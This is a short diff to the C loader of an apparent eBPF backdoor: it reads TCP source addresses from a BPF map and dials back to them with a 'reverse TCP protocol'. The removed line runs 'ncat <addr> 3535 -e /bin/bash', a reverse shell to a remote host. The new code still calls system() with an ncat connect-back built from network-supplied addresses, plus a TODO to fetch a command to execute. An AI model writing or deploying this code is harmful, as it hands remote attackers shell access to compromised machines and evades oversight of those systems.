@@ -8,6 +8,9 @@
 #include <unistd.h>
 #include "proto.h"
 
+
+#define PORT 3535
+
 int main(int argc, char **argv) {
     char path[PATH_MAX] = "enohonk.o";
     int loaded;
@@ -63,11 +66,10 @@ int main(int argc, char **argv) {
     printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
     printf("-----------------------------------------------\n");
 
-    int lookup_key = 0, next_key;
-    struct tcp_return ret;
-    int err;
-
     while(1) {
+      int lookup_key = 0, next_key;
+      struct tcp_return ret;
+      int err;
       while (!bpf_map_get_next_key(fd, &lookup_key, &next_key)) {
         err = bpf_map_lookup_elem(fd, &next_key, &ret);
         if (err < 0) {
@@ -79,8 +81,10 @@ int main(int argc, char **argv) {
 
         printf("Begin reverse TCP protocol. Dial: %s\n", addrbuf);
 
+        // TODO Dial back to source addr for the command to execute!
+
         char cmd[512];
-        sprintf(cmd, "ncat %s 3535 -e /bin/bash &", addrbuf);
+        sprintf(cmd, "ncat %s %d", addrbuf, PORT);
         printf("%s\n", cmd);
         system(cmd);
 
